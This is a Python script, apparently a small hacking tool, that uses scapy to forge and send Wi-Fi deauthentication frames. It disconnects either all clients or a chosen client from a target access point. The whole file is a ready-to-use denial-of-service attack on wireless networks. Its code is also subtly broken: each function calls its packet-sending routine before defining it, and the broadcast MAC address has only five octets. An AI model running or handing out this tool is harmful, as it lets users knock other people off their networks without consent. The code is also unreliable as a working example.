from scapy.all import *
import colors
interface = ''
client = '' 
accessPoint = ''

def wifiDeauthAP():
  #getting the information from user, interface, client, and AP mac addresses
  interface = input(colors.green('Select your MONITOR MODE interface (ex. \"wlan0mon\")\n>'))
  print('OK, ' + interface)

  client = 'FF:FF:FF:FF:FF'

  accessPoint = input(colors.green('Input the Access Point\'s BSSID (MAC Address)'))
  print('OK, ' + accessPoint)
  #From here, we print out the info, to make sure the info is correct than we start with deauth, or exit SKWD

  print('__________________________________________________')
  print('Just to be sure, here is are the current settings:\nMonitor Mode Interface:' + interface + '\nClient: All Clients\nAccess Point:' + accessPoint)
  print('__________________________________________________')
  
  correct = input('Is this correct? (y/n):\n>')
  if correct == 'y':
    print('Alright. Starting Deauth...')
    deauthRouter()
  elif correct == 'n':
    print('Exiting...')
    sys.exit()

  def deauthRouter():
    print('Building the packet.')
    #using scapy to craft anf send deauth packet, thanks Abdou Rockikz!
    dot11 = Dot11(addr1=client, addr2=accessPoint, addr3=accessPoint)
    # stack them up
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
    print('Packet ready.')
    # send the packet
    print('Sending packets')
    sendp(packet, inter=0.1, count=100, iface=interface, verbose=1)

def wifiDeauthClient():
  #getting the information from user, interface, client, and AP mac addresses
  interface = input(colors.green('Select your MONITOR MODE interface (ex. \"wlan0mon\")\n>'))
  print('OK, ' + interface)

  client = input('Input the client\'s BSSID (MAC Address)\n>')
  print('OK, ' + client)

  accessPoint = input('Input the Access Point\'s BSSID (MAC Address)\n>')
  print('OK, ' + accessPoint)
  #From here, we print out the info, to make sure the info is correct than we start with deauth, or exit SKWD

  print('__________________________________________________')
  print('Just to be sure, here is are the current settings:\nMonitor Mode Interface:' + interface + '\nClient:' + client + '\nAccess Point:' + accessPoint)
  print('__________________________________________________')
  
  correct = input(colors.red('Is this correct? (y/n):\n>'))
  if correct == 'y':
    print('Alright. Starting Deauth...')
    deauthClient()
  elif correct == 'n':
    print('Exiting...')
    sys.exit()

  def deauthClient():
    print('Building the packet.')
    #using scapy to craft anf send deauth packet, thanks Abdou Rockikz!
    dot11 = Dot11(addr1=client, addr2=accessPoint, addr3=accessPoint)
    # stack them up
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
    print('Packet ready.')
    # send the packet
    print('Sending packets')
    sendp(packet, inter=0.1, count=100, iface=interface, verbose=1)
